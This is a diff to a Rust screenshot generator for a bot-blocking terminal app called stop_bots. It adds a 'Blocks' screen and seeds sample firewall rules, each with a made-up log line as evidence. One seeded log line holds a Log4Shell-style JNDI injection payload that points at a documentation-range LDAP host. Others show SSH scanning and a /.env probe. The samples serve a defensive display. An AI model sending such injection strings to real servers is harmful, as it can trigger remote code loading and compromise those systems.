@@ -43,7 +43,7 @@
 //! relative image paths do not resolve on crates.io.
 //!
 //! `tour.gif` is the one exception, and it buys something the stills
-//! cannot show: that `1`-`4` are how you move between the screens. Its
+//! cannot show: that `1`-`5` are how you move between the screens. Its
 //! frames are the same [`svg`] output rasterised, so it cannot drift from
 //! the stills beside it. It gives up two of the three properties above —
 //! it is a binary blob in review, and it needs fonts on the generating
@@ -166,6 +166,7 @@ async fn main() -> Result<()> {
     app.bot_settings.refresh(&app.db)?;
     app.nginx.refresh(&app.db)?;
     app.firewall.refresh(&app.db, Some(SSH_LOG_FIXTURE))?;
+    app.blocks.refresh(&app.db)?;
 
     // The status tags are computed off the main thread and folded back
     // through an event; with no event loop running they would sit at
@@ -189,6 +190,12 @@ async fn main() -> Result<()> {
         press(KeyCode::Char(c))?;
     }
 
+    // Blocks opens on the newest rule, one added by hand, whose "Why"
+    // panel has no log line to show. One row down is a detector's block
+    // and the request that earned it, which is what the screen is for.
+    app.blocks
+        .handle_key(KeyEvent::from(KeyCode::Down), &app.db, &mut app.message)?;
+
     // Height per screen rather than one size for all: the Dashboard
     // stacks five panels and needs every row, while the Firewall screen at
     // the same height is two lists floating in eighteen blank lines. The
@@ -198,6 +205,7 @@ async fn main() -> Result<()> {
         (Screen::BotSettings, "bot-settings", 19),
         (Screen::Firewall, "firewall", 27),
         (Screen::Nginx, "nginx", 16),
+        (Screen::Blocks, "blocks", 20),
     ] {
         app.screen = screen;
         let path = out.join(format!("{name}.svg"));
@@ -205,8 +213,8 @@ async fn main() -> Result<()> {
         println!("wrote {}", path.display());
     }
 
-    // The same four screens again, as one animation. The stills show what
-    // each screen contains; only this shows that `1`-`4` are how you get
+    // The same five screens again, as one animation. The stills show what
+    // each screen contains; only this shows that `1`-`5` are how you get
     // between them.
     tour_gif(&mut app, &out.join("tour.gif"))?;
 
@@ -437,12 +445,13 @@ const TOUR_ROWS: u16 = 38;
 /// whole loop is under ten seconds.
 const TOUR_DELAY_CS: u16 = 200;
 
-/// The four screens, in the order the number keys put them in.
-const TOUR: [Screen; 4] = [
+/// The five screens, in the order the number keys put them in.
+const TOUR: [Screen; 5] = [
     Screen::Dashboard,
     Screen::BotSettings,
     Screen::Firewall,
     Screen::Nginx,
+    Screen::Blocks,
 ];
 
 /// Renders the tour and writes it as an animated GIF.
@@ -610,15 +619,50 @@ fn seed(db: &Db) -> Result<()> {
         db.set_country_selected(code, true)?;
     }
 
-    // Documentation-range addresses only (RFC 5737).
-    for address in ["192.0.2.44", "198.51.100.17", "203.0.113.9", "192.0.2.201"] {
-        db.add_firewall_rule(&NewFirewallRule {
+    // Documentation-range addresses only (RFC 5737). From several sources,
+    // with the line that made each, because saying why an address is
+    // blocked is what the Blocks screen is for.
+    use stop_bots::db::RuleSource;
+    use stop_bots::protection::Detector;
+    const DAY: i64 = 24 * 60 * 60;
+    for (address, source, ttl_days, evidence) in [
+        (
+            "192.0.2.44",
+            RuleSource::Detector(Detector::SshScanners),
+            Some(5),
+            Some("Sep 10 04:11:07 host sshd[2203]: Failed password for invalid user test from 192.0.2.44 port 51026 ssh2"),
+        ),
+        (
+            "198.51.100.17",
+            RuleSource::Detector(Detector::SshScanners),
+            Some(5),
+            Some("Sep 10 04:12:33 host sshd[2211]: Failed password for invalid user deploy from 198.51.100.17 port 39118 ssh2"),
+        ),
+        (
+            "203.0.113.9",
+            RuleSource::Detector(Detector::ProbePaths),
+            Some(5),
+            Some(r#"203.0.113.9 - - [10/Sep/2025:04:19:50 +0000] "GET /.env HTTP/1.1" 404 153 "-" "Mozilla/5.0""#),
+        ),
+        (
+            "198.51.100.230",
+            RuleSource::Detector(Detector::Injection),
+            Some(7),
+            Some(r#"198.51.100.230 - - [10/Sep/2025:05:02:14 +0000] "GET /?x=${jndi:ldap://203.0.113.5/a} HTTP/1.1" 400 157 "-" "curl/8.5.0""#),
+        ),
+        ("192.0.2.201", RuleSource::Tui, None, None),
+    ] {
+        let rule = NewFirewallRule {
             address: address.into(),
             port: None,
             action: FirewallAction::Block,
-            source: stop_bots::db::RuleSource::Cli,
-            evidence: None,
-        })?;
+            source,
+            evidence: evidence.map(str::to_string),
+        };
+        match ttl_days {
+            Some(days) => db.add_firewall_rule_with_ttl(&rule, days * DAY)?,
+            None => db.add_firewall_rule(&rule)?,
+        };
     }
 
     // `seen_at` is fixed, not `now()`: a screenshot that changes every
